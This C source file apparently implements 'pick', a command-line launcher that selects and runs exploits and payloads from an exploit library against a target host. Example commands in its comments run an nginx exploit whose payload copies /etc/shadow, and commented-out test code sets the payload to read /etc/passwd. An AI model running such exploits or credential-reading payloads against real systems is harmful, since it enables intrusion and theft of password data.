#include "xploit.h"
#include <stdio.h>
#include <string.h>
#include <getopt.h>

#define PICK_OK 0
#define PICK_ERROR -1

#define PICK_FALSE 0
#define PICK_TRUE 1

#define MAX_PARAMS_NUM 8

#undef no_argument
#define no_argument 0
#undef required_argument
#define required_argument 1
#undef optional_argument
#define optional_argument 2

static unsigned int app_filesNumber;
static char **app_files;
static unsigned int app_verbose;
static unsigned int app_show_help;
static unsigned int app_list_testcases;
static unsigned char *app_testcase_name;

static char *pick_exploit;
static char *pick_payload;
static char *pick_target;
static char *pick_exploit_opts;
static char *pick_payload_opts;

static char *payload_opts[MAX_PARAMS_NUM];
static char *exploit_opts[MAX_PARAMS_NUM];

void usage(const char *argv0)
{
    fprintf(stderr,
            "Usage: %s [options] --exploit <exploit> --payload <payload> --exploit-opts <options> --payload-opts <options>\n\n"
            "Options:\n"
            "   -h/--help    : this help\n"
            "   -v    : verbose mode\n"
            "   -d    : debug mode\n"
            "   --show-exploits    : show all available exploits\n"
            "   --show-payloads    : show all available payloads\n"
            "   --exploit-help <exploit>    : how doc for <exploit>\n"
            "   --payload-help <payload>    : how doc for <payload>\n"
            "   --exploit <exploit>    : use <exploit> as exploit\n"
            "   --payload <payload>    : use <payload> as payload\n"
            "   --exploit-opts <n1=v1,[n2=v2,...]>    : provide exploit options\n"
            "   --payload-opts <n1=v1,[n2=v2,...]>    : provide payload options\n"
            , argv0);
}

void parseOpts(char *opts, char *opts_array[])
{
    int i;
    char *cur;

    cur = strtok(opts, ",");
    i = 0;
    while(cur != NULL && i<MAX_PARAMS_NUM-1) {
        opts_array[i] = strdup(cur);
        printf("param: %s\n", cur);
        cur = strtok(NULL, ",");
        ++i;
    }
    opts_array[i] = NULL;
}

static int appGetOptions(int argc, char **argv)
{
    int arg; 
    int option_index;

    struct option long_options[] = {
        {"verbose", no_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {"show-exploits", no_argument, 0, 0},
        {"show-payloads", no_argument, 0, 0},
        {"exploit", required_argument, 0, 0},
        {"payload", required_argument, 0, 0},
        {"target", required_argument, 0, 0},
        {"exploit-opts", required_argument, 0, 0},
        {"payload-opts", required_argument, 0, 0},
        {"exploit-help", required_argument, 0, 0},
        {"payload-help", required_argument, 0, 0},
        {0, 0, 0, 0}
    };

    while ((arg = getopt_long_only(argc, argv, "e:p:t:vh", long_options, &option_index)) != EOF) {
        switch (arg) {
        case 0:
            if (strcmp(long_options[option_index].name, "exploit") == 0) {
                pick_exploit = strdup(optarg);
            }
            else if (strcmp(long_options[option_index].name, "payload") == 0) {
                pick_payload = strdup(optarg);
            }
            else if (strcmp(long_options[option_index].name, "target") == 0) {
                pick_target = strdup(optarg);
            }
            else if (strcmp(long_options[option_index].name, "exploit-opts") == 0) {
                pick_exploit_opts = strdup(optarg);
                parseOpts(pick_exploit_opts, exploit_opts);
            }
            else if (strcmp(long_options[option_index].name, "payload-opts") == 0) {
                pick_payload_opts = strdup(optarg);
                parseOpts(pick_payload_opts, payload_opts);
            }
            else if (strcmp(long_options[option_index].name, "exploit-help") == 0) {
                xploitShowExploitHelp(optarg);
                exit(0);
            }
            else if (strcmp(long_options[option_index].name, "payload-help") == 0) {
                xploitShowPayloadHelp(optarg);
                exit(0);
            }
            else if (strcmp(long_options[option_index].name, "show-exploits") == 0) {
                xploitShowExploits();
                exit(0);
            }
            else if (strcmp(long_options[option_index].name, "show-payloads") == 0) {
                xploitShowPayloads();
                exit(0);
            }
        break;
        case 'h':
            usage(argv[0]);
            exit(0);
        break;
        case 'v':
        break;
        }
    }

    return PICK_OK;
}

// LD_LIBRARY_PATH=./ ./pick --exploit dummy --payload linux/x86/exec --payload-opts CMD="ls -al",TARGET=192.168.1.2

// pick --exploit nginx --payload linux/x86/exec --exploit-opts RHOST=192.168.1.2,RPORT=80 --payload-opts CMD="cat /etc/shadow > /home/mz/shadow" --target=Debian6-x87

// for static compilation with curl:
// http://www.adp-gmbh.ch/cpp/gcc/create_lib.html
// http://stackoverflow.com/questions/9648943/static-compile-of-libcurl-apps-linux-c-missing-library

int main(int argc, char **argv)
{
    int idE, idP;
    int i;

    // init libxploit
    if(xploitInitialize(XPLOIT_GLOBAL_DEBUG) == -1) {
        return 1;
    }

    appGetOptions(argc, argv); 

    // exploit was chosen
    if(pick_exploit) {
        struct Xploit *xploit = xploitUseExploit(pick_exploit); 
        if(xploit == NULL) {
            // get lib erro
            printf("no such exploit found\n");
            return 1;
        }

        if(xploitSetPayload(xploit, pick_payload) == -1) {
            return 1;
        }

        // TODO: seg faults on this: 
        // --exploit-opts Nmap="/usr/bin/nmap",ded=
        // --payload-opts Nmap="/usr/bin/nmap",ded=
        // --payload-opts LPORT 3333 
        if(pick_payload_opts) {
            i = 0;
            while(payload_opts[i] != NULL) {
                printf("payload opt: %s\n", payload_opts[i]);
                char *name = strtok(payload_opts[i], "=");
                char *value = strtok(NULL, "=");
                if(xploitSetPayloadOpt(xploit, name, value) == -1) {
                    return 1; 
                }
                ++i;
            }
        }

        if(pick_exploit_opts) {
            i = 0;
            while(exploit_opts[i] != NULL) {
                printf("exp opt: %s\n", exploit_opts[i]);
                char *name = strtok(exploit_opts[i], "=");
                char *value = strtok(NULL, "=");
                if(xploitSetExploitOpt(xploit, name, value) == -1) {
                    return 1; 
                }
                ++i;
            }
        }

        xploitRunExploit(xploit);
    }
    else {
        usage(argv[0]);
    }

    /*
       printf("NEW WAY:\n");
       printf("exploit: %s\n", xploit->currentExploit->name);
    printf("payload: %s\n", xploit->currentPayload->name);
    printf("param1: %s\n", xploit->currentPayload->params[1].strValue);

    xploitSetPayloadOpt(xploit, "CMD", "ls -al");
    printf("param1: %s\n", xploit->currentPayload->params[1].strValue);
    xploitSetPayloadOpt(xploit, "CMD", "cat /etc/passwd");
    printf("param1: %s\n", xploit->currentPayload->params[1].strValue);
    */

    return 0;
}
